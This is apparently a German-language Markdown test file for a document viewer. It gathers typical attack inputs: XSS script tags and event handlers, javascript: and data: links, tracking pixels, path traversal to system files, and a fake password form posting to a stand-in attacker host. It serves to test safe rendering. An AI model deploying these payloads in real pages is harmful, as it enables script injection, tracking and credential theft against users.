# evil.md – typische Angriffe

Diese Datei muss **harmlos** angezeigt werden: kein Skript läuft, kein externer
Inhalt wird geladen, kein Klick öffnet etwas anderes als http(s) im Browser.

## 1. Skripte

<script>alert('XSS 1: script-Tag')</script>
<script src="https://evil.example/x.js"></script>
<svg onload="alert('XSS 2: svg onload')"><circle r="10"/></svg>
<iframe src="https://evil.example/"></iframe>
<object data="https://evil.example/x.swf"></object>
<embed src="https://evil.example/x.swf">

## 2. Event-Handler

<img src="nicht-vorhanden.png" onerror="alert('XSS 3: onerror')">
<p onclick="alert('XSS 4: onclick')" onmouseover="alert('XSS 5')">Klick mich (passiert nichts)</p>
<details open ontoggle="alert('XSS 6: ontoggle')"><summary>Details</summary>Inhalt</details>

## 3. Gefährliche Links

- [javascript-Link](javascript:alert('XSS 7'))
- [verschleiert](JaVaScRiPt:alert('XSS 8'))
- <a href="jav&#x09;ascript:alert('XSS 9')">mit Tab-Entity</a>
- [data-URL](data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==)
- [lokale Datei](file:///C:/Windows/win.ini)
- [vbscript](vbscript:msgbox("XSS"))
- [protokoll-relativ](//evil.example/pfad)
- [relativer Link](anderes-dokument.md) – wird ignoriert
- [harmloser externer Link](https://example.org) – öffnet im Browser

## 4. Externe Inhalte und Tracking

![Tracking-Pixel](https://evil.example/pixel.gif?user=123)
<img src="http://evil.example/bild.png" alt="externes Bild per HTML">
<style>body { background: url("https://evil.example/track.css") }</style>
<link rel="stylesheet" href="https://evil.example/x.css">
<meta http-equiv="refresh" content="0; url=https://evil.example/">
<base href="https://evil.example/">

## 5. Pfade nach außen

![Path Traversal](../../../../Windows/win.ini)
![Absoluter Pfad](/etc/passwd)
![Windows-Pfad](C:/Windows/System32/drivers/etc/hosts)
![UNC-Pfad](//server/freigabe/bild.png)
![Kodiert](%2e%2e/%2e%2e/geheim.png)

## 6. Formulare und Oberflächen-Täuschung

<form action="https://evil.example/login"><input name="pw" type="password" placeholder="Passwort"><button>Senden</button></form>
<div id="wv-notice" style="position:fixed;top:0;left:0;width:100%;background:red">Gefälschte Warnung</div>
<a id="__kimbaview" name="__kimbaview">DOM-Clobbering-Versuch</a>
<div style="position:fixed;inset:0;background:white">Überdeckung</div>
